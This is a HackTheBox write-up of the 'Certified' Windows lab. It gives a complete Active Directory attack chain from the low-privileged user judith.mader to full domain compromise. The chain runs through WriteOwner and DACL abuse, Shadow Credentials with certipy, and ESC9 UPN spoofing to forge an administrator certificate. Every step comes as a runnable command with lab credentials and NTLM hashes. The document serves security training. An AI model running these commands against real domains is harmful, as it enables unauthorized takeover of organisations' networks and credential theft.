# HackTheBox Writeup: Certified

**Difficoltà:** Easy
**OS:** Windows
**Date:** 09/04/2026

## 1. Executive Summary

During the security assessment of the "Certified" environment, a critical attack chain was identified involving Active Directory Access Control List (ACL) misconfigurations and a known vulnerability in Active Directory Certificate Services (ADCS). Starting from an assumed-breach scenario with low-privileged credentials (judith.mader), the assessment successfully chained group administration abuse with Shadow Credentials and UPN Spoofing (ESC9 attack), ultimately leading to full domain compromise.

## 2.Initial Enumeration Phase

### 2.1 Port Scanning and Network Discovery

The assessment began with mapping the open ports and exposed services on the target using

```
sudo nmap -sC -sV 10.129.231.186 -oA nmap/certified
```

<img width="1095" height="587" alt="image" src="https://github.com/user-attachments/assets/3176e5fb-428f-47b1-8aec-885f8c9ba762" />


These services clearly indicate that the target operates as a Domain Controller. Through LDAP and Kerberos responses (and SSL certificate extraction), the domain name certified.htb and the hostname DC01 were identified. Consequently, the DNS records were mapped locally in the /etc/hosts file to ensure proper resolution for the offensive toolset.

## 3. Attack Path Analysis (BloodHound)

Utilizing the initial credentials (judith.mader:judith09), deep domain enumeration was performed to map trust relationships and object permissions using rusthound-ce:

```
rusthound-ce -d certified.htb -u judith.mader -p 'judith09'
```

<img width="1197" height="452" alt="image" src="https://github.com/user-attachments/assets/d10f8008-a63c-4539-b3de-6e9c9c581274" />

**Graph Analysis (Attack Path):**
The analysis revealed that **judith.mader** holds no direct privileges over domain administrators or sensitive objects. However, a clear delegation chain (logical pivoting) exists:

1)**judith.mader** holds the WriteOwner privilege over the **Management** group.
2)The **Management** group holds the GenericAll (Full Control) privilege over the **management_svc** user.
3)The **management_svc** user holds GenericAll over the **ca_operator** user.
4)The **ca_operator** user has enrollment rights on certificate templates.

The strategic objective is to force **judith.mader** into the **Management** group to inherit all downstream permissions.

## 4. Horizontal Privilege Escalation: ACL Abuse

### 4.1 Theoretical Context: WriteOwner Abuse

In Active Directory, the **WriteOwner** privilege does not automatically grant access to an object's data, nor does it allow for modifying its members. It strictly allows a user to claim **Ownership** of the object.
However, Windows security architecture dictates that the Owner of an object implicitly possesses the right to modify its security rules (its DACL - Discretionary Access Control List). Therefore, the correct methodological kill-chain involves three logical steps:

1)Take Ownership of the group.
2)As the owner, **inject a new rule (ACE)** granting oneself the permission to add members (WriteMembers).
3)**Add oneself** to the group physically.

### 4.2 Practical Execution
#### Step 1: Taking Ownership

Using the **owneredit.py** script, we exploit the privilege to set Judith as the new owner of the **Management** group.

```
owneredit.py -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.129.231.186
```

<img width="943" height="151" alt="image" src="https://github.com/user-attachments/assets/07d905f3-a76b-49a9-a1c0-b38b006dec16" />

#### Step 2: Modifying the DACL

Now acting as the owner, we use **dacledit.py** to grant ourselves explicit rights to modify group membership.

```
dacledit.py -action write -rights WriteMembers -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.129.231.186
```

<img width="957" height="112" alt="image" src="https://github.com/user-attachments/assets/ee3791e6-fbfa-44b2-b7da-11585d22e032" />


#### Step 3: Group Addition and Verification

Finally, we add Judith to the group via an RPC call and verify the operation's success.

```
net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S 10.129.231.186
net rpc group members Management -U certified/judith.mader%judith09 -S 10.129.231.186
```

<img width="698" height="60" alt="image" src="https://github.com/user-attachments/assets/a3e2bd53-4a7a-4166-ab6f-5ebc2106ce9c" />

## 5. Lateral Movement: Shadow Credentials

As a member of the **Management** group, we now inherit the GenericAll permission over **management_svc**.

### 5.1 Operational Security (OpSec) Context

While we could simply reset the password for **management_svc**, doing so in a real Red Team engagement would lock the legitimate user out, break services, and immediately alert the SOC.
To maintain stealth (OpSec), we deploy the **Shadow Credentials attack**. This technique writes a legitimate cryptographic certificate into the victim's **msDS-KeyCredentialLink** attribute. This allows the attacker to request a Kerberos Ticket Granting Ticket (TGT) on the victim's behalf and decrypt their NTLM hash via PKINIT, all without touching the original password. The **certipy-ad shadow** auto script also handles the cleanup (Restoring the old thing) once the hash is dumped.

### 5.2 Execution 

**Compromising management_svc:**

```
certipy-ad shadow auto -target certified.htb -dc-ip 10.129.231.186 -username judith.mader@certified.htb -password judith09 -account management_svc
```

<img width="960" height="431" alt="image" src="https://github.com/user-attachments/assets/504a4c33-de72-49c6-a65a-9089ffada551" />

Having obtained the hash, we apply the exact same technique via Pass-The-Hash on the next target, since **management_svc ** holds GenericAll over **ca_operator**.

**Compromising ca_operator:**

```
certipy-ad shadow auto -target certified.htb -dc-ip 10.129.231.186 \
  -username management_svc@certified.htb \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -account ca_operator
```

<img width="947" height="425" alt="image" src="https://github.com/user-attachments/assets/1527c9fd-1a36-44f5-9340-1d147d3b9ab4" />

## 6. Final Exploitation: AD CS and ESC9 Vulnerability

Authenticating as **ca_operator**, we query the Domain Controller for exposed certificate templates.

```
certipy-ad find -u "ca_operator@certified.htb" -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -vulnerable -stdout
```

<img width="974" height="92" alt="image" src="https://github.com/user-attachments/assets/afc258d4-e191-48d6-8b3c-5c9676235265" />

The output confirms that the **CertifiedAuthentication** template is vulnerable to **ESC9**.

### 6.1 Theoretical Context: ESC9 and "UPN Spoofing"

The ESC9 attack occurs when a certificate template allows client authentication but lacks the **CT_FLAG_NO_SECURITY_EXTENSION** flag (meaning it doesn't securely bind the requester's identity).
Because we have GenericWrite/GenericAll over the requesting user (**ca_operator**), we can arbitrarily overwrite the victim's **UPN (UserPrincipalName)** attribute.

**Phase 1:** We change **ca_operator**'s UPN to the string **administrator** (leaving out the **@domain** to avoid a constraint violation, as the real admin is **administrator@certified.htb**).

**Phase 2:** We request a certificate. The Certificate Authority (CA) reads the attribute and bakes the identity "administrator" into the Subject Alternative Name (SAN) field of the generated certificate.

**Phase 3 (Crucial - The Fallback Mechanism):** If we attempted to log in immediately, Windows would throw a "Client Name Mismatch" error. The Domain Controller would read "administrator" from the certificate, check the database, and see that UPN currently belongs to the SID of **ca_operator**. For the exploit to succeed, we must remove the spoofed UPN from **ca_operator** before authenticating. By doing so, when Windows reads "administrator" and finds no exact UPN match, a fallback mechanism is triggered, mapping the login directly to the default built-in Domain Administrator account.

### 6.2 ESC9 Attack Execution

#### 1. UPN Spoofing:
We alter **ca_operator's** UPN, changing it to **administrator**.

```
certipy-ad account update -u "management_svc@certified.htb" \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator \
  -upn administrator \
  -dc-ip 10.129.231.186
```
<img width="457" height="67" alt="image" src="https://github.com/user-attachments/assets/2ce7b33d-f38c-49ef-8437-af4e11a2fe92" />

#### 2. Fraudulent Certificate Request:
```
certipy-ad req -u "ca_operator@certified.htb" \
  -hashes b4b86f45c6018f1b664f70805f45d8f2 \
  -ca "certified-DC01-CA" \
  -template "CertifiedAuthentication" \
  -dc-ip 10.129.231.186
```

<img width="632" height="251" alt="image" src="https://github.com/user-attachments/assets/82047e5d-05bd-45d7-a24f-dc1ac7646f9e" />

#### 3. UPN Restoration (Triggering the Fallback):

We revert the **ca_operator** account back to its original state. This step is vital so Kerberos authentication fails to find the spoofed UPN and resolves to the real Domain Admin.

```
certipy-ad account update -u "management_svc@certified.htb" \
  -hashes a091c1832bcdd4677c28b5a6a1295584 \
  -user ca_operator \
  -upn ca_operator@certified.htb \
  -dc-ip 10.129.231.186
```

<img width="583" height="171" alt="image" src="https://github.com/user-attachments/assets/276cee5a-da26-4017-b5e5-960ff1edcfdc" />

#### 4. PKINIT Authentication (Domain Admin):

We use the forged certificate to authenticate against the Domain Controller.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

<img width="959" height="204" alt="image" src="https://github.com/user-attachments/assets/59516e7e-c707-45be-b789-fa20a83eb91e" />

The authentication is successful, yielding the NTLM hash of the built-in **Administrator** account. At this point, the Active Directory domain **certified.htb** is fully compromised.
